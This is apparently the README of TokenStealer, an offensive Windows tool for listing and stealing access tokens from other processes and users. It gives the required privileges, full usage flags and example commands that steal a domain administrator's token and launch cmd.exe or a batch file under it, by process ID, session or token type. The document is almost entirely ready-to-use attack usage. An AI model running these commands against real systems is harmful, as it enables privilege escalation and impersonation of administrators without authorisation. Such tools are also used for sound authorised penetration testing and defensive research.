# TokenStealer
A simple tool I wrote some time ago for stealing and playing with Windows tokens.<br>
Parts of code have been taken and adatpted from https://github.com/FSecureLABS/incognito
<br>
Clearly, you will require Impersonation or AssignPrimary privilege and Debug privilege to access all processes.<br>
Typically, you would run the tool with the highest local privileges, such as SYSTEM.
<br><br>
```
TokenStealer.exe
[+] My personal simple and stupid  Token Stealer... ;)
[+] v1.0 @decoder_it 2023

[!] Usage:
         -l: list all user's token
         -e: list all user's token with extended info -> [user]:[token_level (2)=Impersonation, (3)=Delegation,(P)=Primary>]:[pid]:[SessionId]
         -p: <pid> list/steal  token from specfic  process pid
         -u: <user> list/steal token of user
         -c: <command> command to execute with token 
         -t: force use of impersonation Privilege 
         -b: <token level> needed token type: 1=Primary,2=Impersonation,3=Delegation 
         -s: <SessionId> list/steal token from specific Session ID

=Examples=

TokenStealer.exe -e -b 1 
-> list all primary tokens

TokenStealer.exe -l -p 100
-> list all tokens in process pid 100

TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\cmd.exe
-> steal token of the user and execute an interactive  command shell using the AssingPrimary privilege if available

TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\bind.bat  -p 100 -t
-> steal token of the user in process 100 and execute the batch file using Impersonation privilege instead of AssingPrimary

TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\cmd.exe -b 1
-> steal a primary token of the user and execute an interactive  command shell using the AssingPrimary privilege if available

TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\cmd.exe -s 2
-> steal a token of the user in specific SessionID and execute an interactive  command shell using the AssingPrimary privilege if available

```
<img src="https://github.com/decoder-it/TokenStealer/blob/master/Capture.PNG" alt="Alt text" title="Optional title">




